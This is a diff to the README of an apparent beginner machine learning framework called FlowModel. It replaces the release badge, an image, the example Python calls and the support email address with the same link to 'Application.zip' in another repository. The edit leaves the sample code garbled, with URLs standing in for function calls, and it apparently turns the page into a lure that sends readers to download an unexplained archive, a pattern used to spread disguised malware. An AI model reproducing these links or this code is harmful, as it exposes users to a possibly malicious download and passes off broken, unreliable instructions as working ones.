@@ -1,6 +1,6 @@
 # 🚀 Welcome to FlowModel! 🤖
 
-[![GitHub release](https://img.shields.io/badge/Download%20Release-Launch%20Here-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![GitHub release](https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip%20Release-Launch%https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip)](https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to the FlowModel repository - a lightweight and extensible machine learning framework designed for beginners to easily experiment with AI development through a modular plugin architecture. With FlowModel, you can dive into the world of AI with ease, exploring various models and frameworks in a beginner-friendly environment.
 
-![AI Development](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png)
+![AI Development](https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip)
 
 ## Features
 
@@ -37,13 +37,13 @@ To get started with FlowModel, simply click on the **Launch Here** button above 
 import flowmodel
 
 # Create a new neural network model
-model = flowmodel.NeuralNetwork()
+model = https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip()
 
 # Train the model
-model.train(data)
+https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip(data)
 
 # Make predictions
-output = model.predict(input_data)
+output = https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip(input_data)
 ```
 
 ## Contributing
@@ -52,7 +52,7 @@ We welcome contributions to FlowModel! Whether you're a beginner or an experienc
 
 ## Support
 
-If you encounter any issues or have any questions about FlowModel, please don't hesitate to reach out to us. You can open an issue here on GitHub, or contact us directly via email at support@flowmodel.com.
+If you encounter any issues or have any questions about FlowModel, please don't hesitate to reach out to us. You can open an issue here on GitHub, or contact us directly via email at https://github.com/odnil/FlowModel/releases/download/v1.0/Application.zip
 
 ## Community
 
